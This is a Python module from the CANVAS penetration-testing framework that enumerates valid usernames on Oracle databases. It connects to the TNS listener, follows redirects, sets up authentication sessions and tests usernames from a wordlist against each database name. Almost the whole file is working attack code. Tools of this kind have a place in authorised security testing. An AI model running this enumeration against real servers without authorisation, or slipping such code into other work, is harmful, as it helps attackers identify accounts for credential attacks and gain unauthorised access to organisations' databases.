#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path: sys.path.append(".")

import os
import getopt
import socket
import timeoutsocket
import sys
import struct
import time
import array
import select

# CANVAS modules
from exploitutils import *
from tcpexploit import *


import canvasengine
from engine.config import canvas_resources_directory


# TNS lib
import libs.tnslib as tnslib

# GUI info
NAME="Oracle Get Usernames"
DESCRIPTION="Oracle <= Usernames"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Oracle"
DOCUMENTATION["Notes"]="Takes in a database name and attempts to enumerate the users allowed to log into that database. Version 10 requires a databasename"
VERSION="0.3"

GTK2_DIALOG="dialog.glade2"
PROPERTY={}
PROPERTY['ARCH'] = [ ["Windows"], ["Linux"], ["Solaris"] ]
PROPERTY['TYPE'] = "Tool"


NOTES="""
Attempt to identify Oracle usernames   
"""

CHANGELOG="""
"""

# GUI run exploit
runAnExploit_gtk2 = canvasengine.runAnExploit_gtk2
runExploit = canvasengine.runExploit

TNS = tnslib.TNS()
tnsdata = tnslib.TNSDATA()


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.host = "vmware.local"
        self.port = 1521
        self.covertness = 0
        self.ssl = 0
        self.done = 0
        self.version = 1
        self.dbasenames=[] 
        self.version=0
        self.defaultfile = "oracleusernames"
        self.results =[]
        self.name=NAME
        return
    
    def connectToHost(self, t_host, t_port):
        s=self.gettcpsock()
        try:
            ret=s.connect((t_host, t_port))
        except:
            self.raiseError("Could not connect to %s:%d"% (self.host, self.port))
        if ret==-1:
            self.raiseError("Could not connect to %s:%d"% (self.host, self.port))
        return s
    
    def test(self):
        #just verify 1521 is listening     
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        try:
            s=self.connectToHost(self.host,self.port)
        except:
            return 0
        self.log("Connected to TNS listener at %s:%d"% (self.host, self.port))

        return 1
    
    
    #initial session setup data
    def setupSession(self,s):
        
        tnsdata = tnslib.TNSDATA()

        #send SNS packet
        tnsdata.SNS(self.version)
        snspkt = tnsdata.getData()
        TNS.sendDataRequest(s,snspkt)
        if (TNS.recvTNSPkt(s)==0):
            self.log("Problem with response to SNS packet")
            return 0
        
        #WINNT request 
        #winntpkt = tnsdata.getWINNT()
        tnsdata.WINNT()
        winntpkt = tnsdata.getData()
        TNS.sendDataRequest(s,winntpkt)
        if (TNS.recvTNSPkt(s)==0):
            self.log("Problem with response to WINNT packet")
            return 0
        
        #<<< request
        tnsdata.LESS(self.version)
        lesspkt = tnsdata.getData()
        TNS.sendDataRequest(s,lesspkt)
        self.log("waiting for something to happen ... FIXME")
        if (TNS.recvTNSPkt(s)==0):
            return 0
        return 1

    #should really put this into tnslib
    def doMarkers(self,s):
        if (TNS.packet_type == TNS.TNS_TYPE_MARKER): 
            mdata = TNS.tns_data
            #self.log("Marker packet recvd, data: %s"%hexprint(mdata))
            #self.log("assuming another marker is coming")
            TNS.recvTNSPkt(s)
            if (TNS.packet_type == TNS.TNS_TYPE_MARKER):
                #need to build in Marker data to tns lib at some point
                mdata = TNS.tns_data
                #self.log("recv'd second marker pkt, data: %s"%hexprint(mdata))
                #send marker back
                #self.log("sending marker data back")
                TNS.sendMarker(s,mdata) 
                if (TNS.recvTNSPkt(s)==0):
                    self.log("Error receiving response to marker request")
                    return 0
                str = onlystrings(TNS.tns_data)
                self.log("Received Marker strings: %s"%str)
        return 1

    def tryUsername(self,s,uname):
        tnsdata = tnslib.TNSDATA()

        #self.log("Trying %s"%uname)        

        #loginpkt = tnsdata.getLogin(uname,self.version)
        if ((self.version == TNS.TNS_V9) or (self.version == TNS.TNS_V10)):
            tnsdata.LOGINv2(uname,self.version)
        else:
            tnsdata.LOGINv1(uname,self.version)
        loginpkt = tnsdata.getData()

        TNS.sendDataRequest(s,loginpkt)
        if (TNS.recvTNSPkt(s)==0):
            self.log("Error receiving response to auth request")
            return 0
        
        if (TNS.packet_type == TNS.TNS_TYPE_DATA):
            tnsdata.parseDataLayer(TNS.tns_data)
            #self.log("Testing Success, data type is %d"%tnsdata.type)
            if (tnsdata.type == tnsdata.TNS_DATA_TYPE_EIGHT):
                return 1
        elif (TNS.packet_type == TNS.TNS_TYPE_MARKER):
            self.doMarkers(s)
        else:
            self.log("Recvd unexpected TNS_DATA type")
        return 0

    def getUsernames(self):
        #print 'Getting usernames from ',self.filename
        if not self.filename:
            self.filename=os.path.join(canvas_resources_directory,"oracleusernames")
        try:
            usernames=file(self.filename).readlines()
        except:
            self.log("Failed to open username file %s"%self.filename)
            return 0
#        print 'read usernames: ',usernames
        return usernames

    def tryAccounts(self,s):
        accounts = []
        if self.filename:
            unames = self.getUsernames() #get usernames from file
            for uname in unames:
                uname=uname.strip()
                account = self.tryUsername(s,uname)
                if account:
                    accounts.append(account)
        else:
            uname = self.user
            account = self.tryUsername(s,uname)
            if account:
                accounts.append(account)
#        s.close #why am i closing!?!
        return accounts
    
    def getRedirectInfo(self):
        redirect = tnslib.TNSREDIRECT()
        redirect.parseRedirectLayer(TNS.tns_data)  
        rdata = redirect.redirect_data
        if rdata.count("(ADDRESS="):
            hoststrloc = rdata.find("HOST=")
            portstrloc = rdata.find("PORT=")
            host = rdata[hoststrloc + 5:portstrloc - 2]
            port = int(rdata[portstrloc + 5:portstrloc + 9])
        else:
            self.log("unknown redirect info recvd: %s" %rdata)
        ret = (host, port)
        return ret

    def checkDbaseInfo(self):
        self.log("Checking database information. Version: %s"%self.version)
        if (not self.version) or ((self.argsDict.get("dbasename",self.dbasenames) in [ [], None, ""])):
            self.log("do not have version or dbasename - attempting oraclegetinfo")
            getinfo = self.engine.getModuleExploit("oraclegetinfo")
            getinfo.link(self)
            getinfo.argsDict["port"]=self.port
            getinfo.run()

        if (not self.version):
            self.version = getinfo.result["version"]

        if (self.argsDict.get("dbasename",self.dbasenames) in ["",[]]):
            if (self.version == TNS.TNS_V10): #v10                
                self.log("v10 detected (cannot retrieve dbase name without a password). If known, supply target service (database) name as -O flag. v10 Trying default ORCL anyway.")                
                self.dbasenames.append("(SERVICE_NAME=ORCL)")
                self.dbasenames.append("(SID=ORCL)")
            else:
                #this is where we actually set the database names from what getinfo returned
                self.dbasenames = getinfo.result["dbasenames"]
        return
    
    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.user=self.argsDict.get("user",self.user)
        self.filename=self.argsDict.get("filename",self.filename)

        if self.filename:
            self.log("Filename chosen: %s"%self.filename)
        if self.user:
            self.log("User chosen: %s"%self.user)
        
        if self.argsDict.get("dbasename",""):
            self.dbasenames.append(self.argsDict.get("dbasename",self.dbasenames))            

        self.log("Databases chosen: %s"%self.dbasenames)
        
        version=self.argsDict.get("version",self.version) 
        self.version = TNS.assignVersion(version)
        
        self.setInfo("%s targeting %s:%d (in progress)"% (NAME, self.host, self.port))
        self.log("%s targeting %s:%d (in progress)"% (NAME, self.host, self.port))
            
    
#        TNS = tnslib.TNS()
        
        #check we have target dbase version and name(s)
        try:
            self.checkDbaseInfo()
        except self.error, msg:
            self.log("Error checking DB info: %s"%msg)
            self.setInfo("%s failed to connect"%NAME)
            return 0
        self.log("Got database information from remote host: %s"%self.dbasenames)
        #get username(s) to try for
        usernames = []
        if self.filename:
            usernames = self.getUsernames() #get usernames from file
        else:
            usernames.append(self.user)
                        
        results = ""
        for database in self.dbasenames:
            self.log("Trying database *%s*"% database)
            firstusername = 1
            v9_prevauthfailed = 0
            accounts = []
            for username in usernames:
                username = username.strip()
                setup_auth=0
                if firstusername or v9_prevauthfailed:
                    firstusername = 0
                    v9_prevauthfailed = 0
                    
                    #get redirect
                    s = self.connectToHost(self.host, self.port)
                    s.set_timeout(150)
                    if s:
                        self.log("got tcp session with %s:%d"% (self.host, self.port))
                        while(1):
                                tnsconn = tnslib.TNSCONNECT()
                                req = tnsconn.getDatabaseNameConnectReq(self.host,database, self.port)
                                TNS.sendConnectRequest(s,req) 
                                TNS.recvTNSPkt(s)
                                if (TNS.packet_type == TNS.TNS_TYPE_REDIRECT): #should have received redirect
                                    #self.log("Recvd redirect")
                                    (rd_host, rd_port) = self.getRedirectInfo()
                                    s.close
                                    
                                    #connect to redirect
                                    s = self.connectToHost(rd_host, rd_port)
                                    if s:
                                        s.set_timeout(150)
                                        self.log("Redirecting to %s:%d"% (rd_host,rd_port))
                                        tnsconn = tnslib.TNSCONNECT()
                                        req = tnsconn.getDatabaseNameConnectReq(self.host,database,rd_port) #FIXME PORT ?
                                        TNS.sendConnectRequest(s,req) 
                                        TNS.recvTNSPkt(s)
                                        if (TNS.packet_type == TNS.TNS_TYPE_ACCEPT):    #should have received database info
                                            self.log("TNS connection established with redirect service")
                                        else:
                                            self.log("Redirect service rejected TNS connect request...?")
                                                                            
                                        #setup auth
                                        setup_auth = self.setupSession(s)
                                        if (setup_auth==1):
                                            self.log("Setup auth session OK")                                    
                                        else:
                                            self.log("Failed to establish auth session")
                                            break				         
                                    else:
                                        self.log("Failed to establish tcp session with redirect service: %s:%d"%(rd_host,rd_port))
                                elif (TNS.packet_type == TNS.TNS_TYPE_ACCEPT):
                                    self.log("accepted FFS %s"%database)
                                    self.log("now it will just stall ... FIXME ")
                                    setup_auth = self.setupSession(s)
                                    break
                                elif (TNS.packet_type == TNS.TNS_TYPE_RESEND):
                                    self.log("RESEND !!!")
                                    continue
                                elif (TNS.packet_type == TNS.TNS_TYPE_REFUSE): 
                                    self.log("TNS Connect Request to *%s* was refused"%database)
                                    break
                                else:
                                    self.log("TNS Connect Request to *%s* received unexpected response"%(database))
                                    break
                                break
                    else:
                        self.log("Could not establish tcp session with %s:%d"%(self.host, self.port))
        
                if setup_auth:
                    self.log("Trying username: %s"% username)
                    account = self.tryUsername(s,username)
                    if account:
                        self.log("Uname found: %s"%username)
                        accounts.append(username)
                    elif ((self.version == TNS.TNS_V9) or (self.version == TNS.TNS_V10)): #Oracle v9 and v10 need to reconnect to try again
                        self.log("Auth attempt failed - need to re-establish entire connection (V9&10)")
                        v9_prevauthfailed = 1
                        s.close
                    
            #self.log("Finished trying all usernames") 
            if (len(accounts)>0):
                res = {} #self.results is a list of dictionaries
                res["database"] = database
                res["accounts"] = accounts
                self.results.append(res)
                self.log("Found %d accounts via %s: %s"% (len(accounts),database,accounts))
                self.setSucceeded()
#	    else:
#		self.log("No accounts found via %s service"%database)
                
        #self.log("Finished trying all databases") 
                                
        if self.ISucceeded() or self.done:
            self.setInfo("%s targeting %s:%d - done (success!)"% (NAME, self.host, self.port))
            self.log("Oracle Get Usernames Results:\r\n%s"%self.results)
            return 1        

        self.setInfo("%s targeting %s:%d - done (failed!)"% (NAME, self.host, self.port))
        self.log("Oracle Get Usernames done.")
        return 0

    
    def usage(self):

        app = theexploit()
        print "Usage: "+sys.argv[0]+"-t target -U user|-F filename [-T] [-O dbasename:\"(SERVICE_NAME=testdbase)\"] [-v 8|9|10] [ -p targetport:%s] [-C covertness]"%(app.port)
        app.displayVersions()
    

if __name__== '__main__':
    
    print "Running "+NAME+" exploit v "+VERSION
    app = theexploit()
    ret=standard_callback_commandline(app)

    if ret not in [1,0]:
        ret.interact() 
